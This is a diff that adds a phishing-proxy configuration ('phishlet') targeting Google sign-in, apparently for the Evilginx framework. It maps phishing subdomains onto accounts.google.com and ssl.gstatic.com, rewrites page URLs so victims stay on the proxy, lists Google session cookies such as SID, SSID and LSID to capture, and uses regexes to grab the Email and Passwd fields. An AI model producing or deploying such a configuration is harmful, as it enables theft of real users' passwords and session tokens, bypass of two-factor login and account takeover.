@@ -1,0 +1,27 @@
+name: 'google'
+author: '@Hary'
+min_ver: '2.0.0'
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: true, is_landing: false}
+sub_filters:
+  - {hostname: 'accounts.google.com', sub: 'accounts', domain: 'google.com', search: 'https://{hostname}/signin/', replace: 'https://{hostname}/signin/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+  - {hostname: 'accounts.google.com', sub: 'accounts', domain: 'google.com', search: 'https://{hostname}/speedbump/', replace: 'https://{hostname}/speedbump/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+  - {hostname: 'accounts.google.com', sub: 'accounts', domain: 'google.com', search: 'href="://{hostname}', replace: 'href="https://ssl.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+  - {hostname: 'accounts.google.com', sub: 'accounts', domain: 'google.com', search: 'https://{hostname}/CheckCookie', replace: 'https://{hostname}/CheckCookie', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+  - {hostname: 'ssl.gstatic.com', sub: 'ssl', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://ssl.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/xhtml+xml', 'application/xml']}
+auth_tokens:
+  - domain: '.google.com'
+    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID','CGIC','SNID', 'LSID','1P_JAR',]
+  - domain: 'accounts.google.com'
+    keys: ['GAPS', 'LSID']	
+user_regex:
+  key: 'Email'
+  re: '(.*)'
+pass_regex:
+  key: 'Passwd'
+  re: '(.*)'
+landing_path:
+  - '/signin/v2/identifier'
+  - '/ServiceLogin'
+  
